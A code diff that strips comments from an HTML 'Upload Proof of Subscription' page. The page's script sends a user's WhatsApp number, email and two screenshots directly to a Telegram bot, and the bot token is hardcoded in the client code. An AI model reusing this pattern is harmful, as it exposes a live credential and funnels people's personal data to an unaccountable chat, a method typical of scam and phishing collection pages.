@@ -6,7 +6,6 @@
     <title>Upload Proof of Subscription</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
-        /* General Styles */
         body {
             font-family: Arial, sans-serif;
             background: black;
@@ -65,8 +64,6 @@
         button:hover {
             background: darkorange;
         }
-
-        /* Ensure Dropdown List Background is Black */
         .iti__country-list {
             background: black !important;
             color: white !important;
@@ -82,15 +79,11 @@
         .iti__country:hover {
             background: gray !important;
         }
-
-        /* Keep input field unchanged */
         .iti input,
         .iti input[type="tel"] {
             background: rgba(255, 255, 255, 0.2) !important;
             color: white;
         }
-
-        /* Popup Styling */
         .popup {
             display: none;
             position: fixed;
@@ -131,8 +124,6 @@
             <button type="submit">Submit</button>
         </form>
     </div>
-
-    <!-- Popup -->
     <div id="popup" class="popup">
         <span>Submitting your proof, please wait...</span>
     </div>
@@ -149,8 +140,6 @@
 
         document.getElementById("uploadForm").addEventListener("submit", async function(event) {
             event.preventDefault();
-
-            // Show popup
             document.getElementById("popup").style.display = "block";
 
             const botToken = "7607642073:AAGeyNCG4fuahJLGzqS-Zv2-oXbH_YpA6vQ";
@@ -177,8 +166,6 @@
                 document.getElementById("popup").style.display = "none"; // Hide popup
                 return;
             }
-
-            // Send WhatsApp number and email as a message
             let messageText = `New Proof of Subscription:\n📞 WhatsApp: ${fullPhoneNumber}\n📧 Email: ${email}`;
 
             try {
@@ -190,8 +177,6 @@
             } catch (error) {
                 console.error("Error sending message to Telegram:", error);
             }
-
-            // Function to send images
             async function sendImage(file) {
                 let formData = new FormData();
                 formData.append("chat_id", chatId);
@@ -206,12 +191,8 @@
                     console.error("Error sending image to Telegram:", error);
                 }
             }
-
-            // Send both screenshots
             await sendImage(screenshot1);
             await sendImage(screenshot2);
-
-            // Hide popup and show success message
             document.getElementById("popup").style.display = "none";
             alert("Proof of subscription submitted successfully!");
         });
